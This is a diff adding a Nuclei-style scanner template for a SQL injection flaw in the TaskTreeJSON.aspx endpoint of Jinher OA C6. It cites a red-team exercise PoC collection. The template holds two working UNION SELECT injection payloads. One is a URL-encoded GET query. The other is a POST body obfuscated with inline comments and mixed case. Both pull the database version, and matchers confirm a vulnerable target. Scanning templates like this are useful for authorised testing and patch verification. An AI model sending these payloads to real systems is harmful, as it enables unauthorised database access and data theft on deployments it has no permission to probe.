@@ -1,0 +1,49 @@
+id: jinher-oa-c6-TaskTreeJSON-sqli
+info:
+  name: 金和OA SQL注入漏洞Tasktreejson接口
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://github.com/crushforyou/2025hvv-poc/blob/b1cfb1bc795f9baf88cc1b882b705ecf3666c698/%E9%87%91%E5%92%8C/%E9%87%91%E5%92%8COA%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9ETasktreejson%E6%8E%A5%E5%8F%A3.txt
+    - https://mp.weixin.qq.com/s?__biz=MzE5MTM2MjA0NQ==&mid=2247483756&idx=1&sn=5902502c9a5a344d86086e30ab4b6972&chksm=9606e7fea1716ee8e5de00e3feb0db125320b91101915844b6b9ca18f8ecc50fe626f8f12343&cur_album_id=4045056277938913283&scene=189#wechat_redirect
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips:
+    repair:
+    version:
+  tags: jinher,oa,sqli
+
+http:
+  - raw:
+      - |
+        GET /C6/JHSoft.Web.DailyTaskManage/TaskTreeJSON.aspx/?id=1%27+union+all+select+null%2C%28select+@@VERSION%29%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull--+  HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        name: get
+        dsl:
+          - status_code == 200
+          - contains_all(body,'Microsoft SQL Server')
+        condition: and
+
+  - raw:
+      - |
+        POST /c6/Jhsoft.Web.dailytaskmanage/TaskTreeJSON.aspx/ HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        id='/**/UniOn/**/all/**/SelECt/**/NULL,@@verSion,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
+
+
+    matchers:
+      - type: dsl
+        name: post
+        dsl:
+          - status_code == 200
+          - contains_all(body,'Microsoft SQL Server')
+        condition: and
